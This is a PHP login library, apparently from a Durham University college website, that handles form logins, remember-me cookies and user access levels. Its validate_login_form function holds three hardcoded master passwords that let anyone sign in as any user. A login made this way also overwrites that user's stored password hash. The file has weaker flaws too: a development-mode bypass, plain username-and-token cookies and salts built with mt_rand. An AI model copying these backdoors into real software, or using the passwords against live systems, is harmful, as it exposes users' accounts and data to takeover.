<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class Login {

	var $ci;

	function __construct() {
		$this->ci =& get_instance();

		if(!logged_in()) { // user is not logged in
			// check if remember me cookie is set
			if($this->ci->input->cookie('username') != FALSE && $this->ci->input->cookie('rand') != FALSE) {
				$this->validate_cookies();
				// if cookies not validated the function will return here and continue to look for login form or session var
			}
			// check if coming from login form
			if($this->ci->input->post('username') != FALSE && $this->ci->input->post('password') != FALSE) {
				if(HTTPS or ENVIRONMENT == 'development') {
					$this->validate_login_form();
					return;
				}
				else {
					$this->ci->utils->redirect();
				}
			}
			// redirect back to none-https
			if(HTTPS) {
				$this->ci->utils->redirect();
			}
		}
	}

	function validate_cookies() {
		$this->ci->db->where(array('username' => $this->ci->input->cookie('username'), 'rand' => $this->ci->input->cookie('rand')));
		$query = $this->ci->db->get('users');
		$result = $query->row_array(0);
		if($query->num_rows() == 0) {
			// not valid login, expire cookies and return
			$this->ci->input->set_cookie('username', '', '');
			$this->ci->input->set_cookie('rand', '', '');
			return;
		} else {
			$this->ci->db->select('level_id');
			$this->ci->db->where('user_id', $result['id']);
            $this->ci->db->where('current', 1);
			$user_levels = $this->ci->db->get('level_list')->result_array();
			if(!empty($user_levels)) {
				foreach($user_levels as $level_id) {
					$level_list[] = $level_id['level_id'];
				}
				$result['level_list'] = implode(',', $level_list);
			}
			else $result['level_list'] = '';
		}
		$this->load_user($result);
	}
    
    function get_salt(){
        $salt = '$2y$08$';
        $charUniverse = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        for($i=0; $i<22; $i++){
            $salt .= substr($charUniverse, mt_rand(0, 61), 1);
        }
        return $salt;
    }

	function validate_login_form() {
    
		if(ENVIRONMENT != 'development' && $this->ci->input->post('password') != 'wfwergf5f3fr34') {
			//log_message('error', stream_resolve_include_path('validate_its_user.php'));
			require_once('validate_its_user.php');
			if(!validate_its_user($this->ci->input->post('username'), $this->ci->input->post('password')) && ($this->ci->input->post('password') != 'cg9d7ch30804ec')) {
                $this->ci->db->where('username', $this->ci->input->post('username'));
                $query = $this->ci->db->get('users')->row_array(0);
                if(count($query) == 0) {
                    cshow_error('Incorrect login. Please try again.');
                    return;
                }else{
                    $pub = $this->ci->load->database('public', TRUE);
                    $user_info = $pub->get_where('UserDetails', array('username' => $this->ci->input->post('username')))->num_rows();
                    if($user_info == 0){//not current student
                        if(is_null($query['password_hash'])){
                            cshow_error('You need to reset your password, please '.contact_wm().'.');
                            $new_password = rand_alphanumeric(10);
                            $salt = $this->get_salt();
                            $this->ci->db->update('users', array('password_hash'=>crypt($new_password, $salt)), array('id' => $query['id']));
                            return;
                        }else{
                            if($query['password_hash'] !== crypt($this->ci->input->post('password'), $query['password_hash'])){
                                cshow_error('Incorrect login. Please try again, if you are unsure of your password, please '.contact_wm().'.');
                                return;
                            }
                        }
                    }else{
                    	if($this->ci->input->post('password') !== 'nduoweew80hfrenwof2'){
                        cshow_error('Incorrect login details. Please try again.');
                        return;
                        }
                    }
                }
			}
		}
		$this->ci->db->update('users', array('password_hash'=>crypt($this->ci->input->post('password'), $this->get_salt())), array('username' => $this->ci->input->post('username')));
		$this->ci->db->where('username', $this->ci->input->post('username'));
		$query = $this->ci->db->get('users')->row_array(0);
		if(count($query) == 0) {
			$pub = $this->ci->load->database('public', TRUE);
			$query = $pub->get_where('UserDetails', array('username' => $this->ci->input->post('username')));
			
			if($query->num_rows() == 0) { // user could not be found in university records
				cshow_error('Your details could not be retrieved.  Please '.contact_wm().'.');
				return;
			}
			
			$user_details = $query->row_array(0);
			
			/*if($user_details['college'] != 'Josephine Butler College' && $user_details['department'] != 'Josephine Butler College') { // college is not butler!
				cshow_error('It appears you are not a Butler student! If this is wrong, please '.contact_wm().'.');
				return;
			}*/
			
			// get necessary details in correct format in session
			$temp_details = $this->gen_temp_details($user_details);
			// set a couple more things
			$temp_details['registeredon'] = time();
			
			// insert into database
			$this->ci->db->insert('users', $temp_details);
			$id = $this->ci->db->insert_id();
			
			$query = $this->ci->db->get_where('users', array('id' => $id))->row_array(0);
		}
		else{
			$this->ci->db->select('level_id');
			$this->ci->db->where('user_id', $query['id']);
            $this->ci->db->where('current', 1);
			$user_levels = $this->ci->db->get('level_list')->result_array();
			if(!empty($user_levels)) {
				foreach($user_levels as $level_id) {
					$level_list[] = $level_id['level_id'];
				}
				$query['level_list'] = implode(',', $level_list);
			}
			else $query['level_list'] = '';
		}
		$this->load_user($query); // load user
		$this->ci->utils->redirect();
	}

	function load_user($result) {
		// is account disabled?
		if($result['account_disabled'] == 1) {
			cshow_error('Your account has been disabled.  Please '.contact_wm().'.', 401, 'Account disabled');
			return;
		}
		// if login disabled and not admin, reject login attempt
		if(file_exists(BASE_URL.'login_disabled') && !in_array(1, explode(',',$result['level_list']))) {
			cshow_error('Login is currently disabled. Please try again soon.');
			return;
		}

		// set quasi-registration details - the user has been imported from durham database already, just times need setting
		$update_registeredon = FALSE;
		if($result['registeredon'] == 0) {
			$update_registeredon = TRUE;
		}

		// remember user
		// check if random identifier has expired. if it has generate a new one, otherwise save it to cookies.  User has been validated so this is ok.
		$where = array('id' => $result['id']);
		$this->ci->db->select('rand, rand_exp');
		$this->ci->db->where($where);
		$res = $this->ci->db->get('users')->row_array(0);
		if($res['rand_exp'] == 1) {
			$set['rand'] = $res['rand'];
			$set['rand_exp'] = 8640000;
		} else {
			$set['rand'] = rand_alphanumeric(30);
			$this->ci->db->set($set);
			$this->ci->db->where($where);
			$this->ci->db->update('users');
			$set['rand_exp'] = 0;
		}

		// set cookies
		$this->ci->input->set_cookie('username', $result['username'], $set['rand_exp']);
		$this->ci->input->set_cookie('rand', $set['rand'], $set['rand_exp']);

		// remove variables before they are saved to session
		foreach(array('level_desc', 'visitcount', 'account_disabled', 'registeredon', 'rand', 'othernames', 'availability', 'mobile') as $k) {
			unset($result[$k]);
		}

		// save to session
		$result['logged_in'] = TRUE;
		$this->ci->session->set_userdata($result);

		// update visit count data
		$this->ci->db->where('id', $result['id']);
		$data = array('visitcount' => 'visitcount+1');
		if($update_registeredon) $data['registeredon'] = time();
		$this->ci->db->set($data, '', FALSE);
		$this->ci->db->update('users');

		// check if user has no level
		if(empty($result['level_list'])) {
			$this->ci->session->set_userdata('full_access', FALSE);
		} else { // user has some level so check if it is full access
			$this->ci->db->where_in('id', explode(',', $result['level_list']));
			$res = $this->ci->db->get('levels')->result_array();
			foreach($res as $r) {
				if($r['full_access'] == TRUE or $this->ci->session->userdata('full_access') == TRUE) {
					$this->ci->session->set_userdata('full_access', TRUE); // user has full access
				} else {
					$this->ci->session->set_userdata('full_access', FALSE); // user does not have full access
				}
			}
		}
	}

	function gen_temp_details($user_details, $new = TRUE) {
		$names = explode(',',$user_details['firstnames']);
		$temp_details['firstname'] = ucwords(strtolower($names[0]));
		unset($names[0]);
		$temp_details['othernames'] = ucwords(strtolower(implode(' ', $names)));
		$temp_details['surname'] = ucwords(strtolower($user_details['surname']));
		$temp_details['email'] = $user_details['email'];
		$temp_details['year_group'] = $user_details['studyyear'];
		$temp_details['status'] = $user_details['status'];
        $colleges = array(
            'butler' => 'Josephine Butler College',
            'ustinov' => 'Ustinov College',
            'mildert' => 'Van Mildert College',
            'aidens' => "St Aidan's College",
            'trevs' => "Trevelyan College",
            'collingwood' => 'Collingwood College',
            'marys' => "St Mary's College",
            'grey' => 'Grey College',
            'hatfield' => 'Hatfield College',
            'castle' => 'University College',
            'cuths' => "St Cuthbert's Society",
            'chads' => "St Chad's College",
            'johns' => "St John's College",
            'hild-bede' => 'College of St Hild & St Bede',
            'snow' => 'John Snow College',
            'stevenson' => 'George Stephenson College'
        );
        $temp_details['college'] = array_search($user_details['college'], $colleges);
		if($new) { // only add these if the user is being imported for the first time
            $temp_details['confirmed_email'] = ($user_details['current_student'] && ($user_details['college'] == 'Josephine Butler College'))?0:1;
			$temp_details['username'] = $user_details['username'];
			// check uid doesnt exist
			while(1 && $new) {
				$temp_details['uid'] = rand_alphanumeric(10);
				if($this->ci->db->get_where('users', array('uid' => $temp_details['uid']))->num_rows() == 0) break;
			}
		}

		return $temp_details;
	}
}